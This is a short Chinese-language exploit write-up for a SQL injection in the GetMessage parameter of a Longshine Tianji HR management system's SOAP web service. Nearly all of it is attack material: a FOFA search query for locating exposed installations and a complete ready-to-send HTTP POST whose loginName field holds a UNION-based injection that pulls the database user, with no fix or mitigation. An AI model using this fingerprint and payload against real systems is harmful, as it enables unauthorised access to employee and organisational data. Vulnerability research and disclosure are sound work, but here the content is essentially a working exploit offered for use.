## 朗新天霁人力资源管理系统GetMessage存在sql注入漏洞

朗新天霁人力资源管理系统GetFunc_code.asmx接口参数 GetMessage 存在SQL注入漏洞，导致数据泄露。

## fofa

```
body="人力资源管理系统" && body="Silverlight"
```

## poc

```
POST /ws/GetFunc_code.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetMessage"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetMessage xmlns="http://tempuri.org/">
      <loginName>1' UNION ALL SELECT ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))-- Bthm</loginName>
    </GetMessage>
  </soap:Body>
</soap:Envelope>
```

![image-20240702222843669](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407022228746.png)
